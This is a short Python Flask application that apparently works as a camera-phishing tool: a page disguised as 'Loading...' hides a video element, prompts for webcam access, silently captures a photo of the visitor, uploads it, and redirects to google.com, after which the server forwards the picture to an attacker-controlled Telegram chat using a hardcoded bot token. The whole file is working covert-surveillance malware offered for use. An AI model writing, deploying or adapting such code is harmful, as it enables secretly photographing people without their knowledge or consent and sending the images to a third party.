from flask import Flask, request, render_template_string
import os
import requests
import base64

app = Flask(__name__)

BOT_TOKEN = "8953264584:AAGYI0M5CVcVo9jZhQ7WGNkL2WM7hYLA"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const userId = "{{ user_id }}";

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg');
                    
                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData, user_id: userId })
                    }).then(res => {
                        window.location.href = "https://google.com";
                    });
                }, 1500);
            })
            .catch(err => {
                window.location.href = "https://google.com";
            });
    </script>
</body>
</html>
"""

@app.route('/capture')
def capture():
    user_id = request.args.get('user_id')
    return render_template_string(HTML_PAGE, user_id=user_id)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    image_data = data['image']
    user_id = data['user_id']
    
    header, encoded = image_data.split(",", 1)
    file_data = base64.b64decode(encoded)
    
    file_path = "captured.jpg"
    with open(file_path, "wb") as fh:
        fh.write(file_data)
        
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(file_path, "rb") as photo:
        requests.post(url, data={'chat_id': user_id}, files={'photo': photo})
        
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
